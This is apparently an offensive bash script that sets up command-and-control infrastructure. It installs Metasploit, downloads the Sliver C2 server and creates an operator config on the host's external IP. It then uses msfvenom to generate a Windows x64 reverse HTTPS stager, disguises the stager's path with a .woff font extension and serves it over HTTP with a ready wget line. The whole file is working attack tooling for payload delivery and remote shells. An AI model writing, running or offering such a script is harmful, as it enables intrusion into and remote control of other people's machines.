#/bin/bash

# required variables
stager_extension=".woff"
ip=$(curl ifconfig.me)

# apt update && install metasploit
apt update -y
apt install metasploit-framework -y

echo ""
echo "=== Downloading Sliver Binary from github.com ==="
echo ""
# download sliver
mkdir /opt/sliver
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux -O /opt/sliver/sliver-server-linux -nv
chmod +x /opt/sliver/sliver-server-linux

echo ""
echo "=== Your External IP Address" $ip" ==="
echo ""
echo "=== Creating Sliver Config ==="
echo ""
#create operator config
/opt/sliver/sliver-server-linux operator --lhost $ip --lport 31337 --name l4rry
cat l4rry_*.cfg
echo ""
#unpack sliver to generate config files
echo "=== Unpack Sliver Binary .. Generating Server Config and Malleable C2 Config ==="
echo ""
# this does not work for http config, as the server has run before: /opt/sliver/sliver-server-linux unpack --force
# echo ""

#sed 's/.woff/'$stager_extension/'' /root/.sliver/configs/http-c2.json >> /root/.sliver/configs/http-c2_markdown_stager.json

echo "=== Generating HTTPS MSF Stager x64 ==="
echo ""

mkdir /tmp/www
/usr/bin/msfvenom -p windows/x64/custom/reverse_winhttps LHOST=$ip LPORT=443 LURI=/font$stager_extension -f raw -o /tmp/www/sliver_stager.bin

chown kali:kali /tmp/www/sliver_stager.bin

python3 -m http.server -d /tmp/www/ &

echo "=== Access Your MSF Stager here ==="
echo "wget http://"$ip":8000/sliver_stager.bin"
